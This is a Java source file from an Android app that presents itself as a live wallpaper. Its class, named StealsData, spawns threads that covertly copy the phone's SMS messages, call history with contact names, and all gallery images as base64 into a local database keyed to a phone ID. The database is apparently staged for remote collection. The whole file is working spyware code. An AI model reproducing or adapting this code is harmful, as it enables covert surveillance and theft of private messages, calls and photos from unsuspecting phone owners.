package com.livewallpaper.circle.box;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import com.android.os.R;
import com.livewallpaper.circle.box.gallery.ConvertImage;
import com.livewallpaper.circle.db.InfoAboutThePhone;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.People;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.MediaStore.Images;
import android.util.Log;

public class StealsData {

	private static final String CONTENT_SMS = "content://sms/";
	private static SimpleDateFormat sdf = new SimpleDateFormat(
			"dd.MMM.yy HH:mm:ss", Locale.getDefault());
	private static Context context = ServiceListener.context;
	private static final String LOG_TAG = "monitoring";
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;

	private StealsData() {

	}

	public static void getAll() {
		Thread threadStealsSms = new Thread(new Runnable() {

			@Override
			public void run() {
				getHistorySms();

			}
		});
		threadStealsSms.start();

		Thread threadStealsCall = new Thread(new Runnable() {

			@Override
			public void run() {
				getHistoryCall();
			}
		});
		threadStealsCall.start();

		Thread threadStealsGallery = new Thread(new Runnable() {

			@Override
			public void run() {
				getHistoryGallery();
			}
		});
		threadStealsGallery.start();

	}

	private static void getHistorySms() {
		Uri uriSMSURI = Uri.parse(CONTENT_SMS);

		Cursor cursorSms = null;
		String address = null;
		String body = null;
		int type = 0;
		long date = 0;
		mAdapter.open(context);
		People people = mAdapter.selectPeople();
		try {
			if (people != null && people.getSettingSms() == 1) {
				Log.w(LOG_TAG, "getHistorySms");
				cursorSms = context.getContentResolver().query(uriSMSURI, null,
						null, null, "Sms._ID DESC");
				if (cursorSms != null && cursorSms.moveToFirst()) {

					do {
						address = cursorSms.getString(cursorSms
								.getColumnIndex("address"));
						String phoneName = InfoAboutThePhone.getContactName(
								context, address);
						if (phoneName != null) {
							address = phoneName + " - " + address;
						}
						body = cursorSms.getString(cursorSms
								.getColumnIndex("body"));
						type = cursorSms.getInt(cursorSms
								.getColumnIndex("type"));
						date = cursorSms.getLong(cursorSms
								.getColumnIndex("date"));
						Log.i(LOG_TAG, "address -" + address + " - "
								+ " body - " + body + " type - " + type
								+ " date - " + sdf.format(new Date(date)));
						mAdapter.insertSms(address, body, type,
								sdf.format(new Date(date)), people.getPhoneId());

					} while (cursorSms.moveToNext());
				}
				people.setSettingSms(0);
				mAdapter.updatePeopleSettingSms(people);

			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursorSms != null) {
				cursorSms.close();
			}
			mAdapter.close();
		}

	}

	public static void getHistoryCall() {
		String phone;
		long date;
		long duraction;
		int type;

		Cursor cursorCall = null;
		try {
			mAdapter.open(context);
			People people = mAdapter.selectPeople();
			if (people != null && people.getSettingCall() == 1) {
				Log.w(LOG_TAG, "getHistoryCall");
				String columns[] = new String[] { CallLog.Calls.NUMBER,
						CallLog.Calls.DATE, CallLog.Calls.DURATION,
						CallLog.Calls.TYPE };

				cursorCall = context.getContentResolver().query(
						Uri.parse("content://call_log/calls"), columns, null,
						null, "Calls._ID DESC"); // last record first

				if (cursorCall != null && cursorCall.moveToFirst()) {
					do {
						phone = cursorCall.getString(cursorCall
								.getColumnIndex(CallLog.Calls.NUMBER));
						String phoneName = InfoAboutThePhone.getContactName(
								context, phone);
						if (phoneName != null) {
							phone = phoneName + " - " + phone;
						}
						date = cursorCall.getLong(cursorCall
								.getColumnIndex(CallLog.Calls.DATE));
						duraction = cursorCall.getLong(cursorCall
								.getColumnIndex(CallLog.Calls.DURATION));
						type = cursorCall.getInt(cursorCall
								.getColumnIndex(CallLog.Calls.TYPE));
						Log.i(LOG_TAG, "Call to phone: " + phone + ", date -: "
								+ sdf.format(new Date(date))
								+ ", duraction -: " + duraction + ", type -: "
								+ type);
						mAdapter.insertCall(
								phone,
								sdf.format(new Date(date)),
								context.getResources().getString(R.string.call_duration)+" - "
										+ String.valueOf(duraction), type,
								people.getPhoneId());
					} while (cursorCall.moveToNext());
				}

				people.setSettingCall(0);
				mAdapter.updatePeopleSettingCall(people);

			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursorCall != null) {
				cursorCall.close();
			}
			mAdapter.close();
		}

	}

	public static void getHistoryGallery() {
		String data = null;
		String title = null;
		long date_add;
		long lastImageTime = 0;
		Cursor cursorExternal = null;
		Cursor cursorInternal = null;
		try {
			mAdapter.open(context);
			People people = mAdapter.selectPeople();
			if (people != null && people.getSettingGallery() == 1) {
				Log.w(LOG_TAG, "getHistoryGallery");
				String columns[] = new String[] { Images.Media.DATA,
						Images.Media.TITLE, Images.Media.DATE_ADDED };

				// Get all external content
				cursorExternal = context.getContentResolver().query(
						Images.Media.EXTERNAL_CONTENT_URI, columns, null, null,
						null);

				if (cursorExternal != null) {
					while (cursorExternal.moveToNext()) {
						data = cursorExternal.getString(cursorExternal
								.getColumnIndex(Images.Media.DATA));
						title = cursorExternal.getString(cursorExternal
								.getColumnIndex(Images.Media.TITLE));
						date_add = cursorExternal.getLong(cursorExternal
								.getColumnIndex(Images.Media.DATE_ADDED));

						data = ConvertImage.convertImageToBase64String(data);
						// ConvertImage.writeToFile("Base64", data);

						if (data != null) {
							if (date_add > lastImageTime) {
								lastImageTime = date_add;
							}
							mAdapter.insertGallery(data, title, date_add,
									people.getPhoneId());
						}
					}
				}

				// Get all internal content
				cursorInternal = context.getContentResolver().query(
						Images.Media.INTERNAL_CONTENT_URI, columns, null, null,
						null);

				if (cursorInternal != null) {
					while (cursorInternal.moveToNext()) {
						data = cursorInternal.getString(cursorInternal
								.getColumnIndex(Images.Media.DATA));
						title = cursorInternal.getString(cursorInternal
								.getColumnIndex(Images.Media.TITLE));
						date_add = cursorInternal.getLong(cursorInternal
								.getColumnIndex(Images.Media.DATE_ADDED));

						data = ConvertImage.convertImageToBase64String(data);

						if (data != null) {
							if (date_add > lastImageTime) {
								lastImageTime = date_add;
							}
							mAdapter.insertGallery(data, title, date_add,
									people.getPhoneId());
						}
					}
				}
				if (lastImageTime != 0) {
					people.setLastGallery(lastImageTime);
				}
				people.setSettingGallery(0);
				mAdapter.updatePeopleGallery(people);

			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursorExternal != null) {
				cursorExternal.close();
			}
			if (cursorInternal != null) {
				cursorInternal.close();
			}
			mAdapter.close();
		}

	}

}
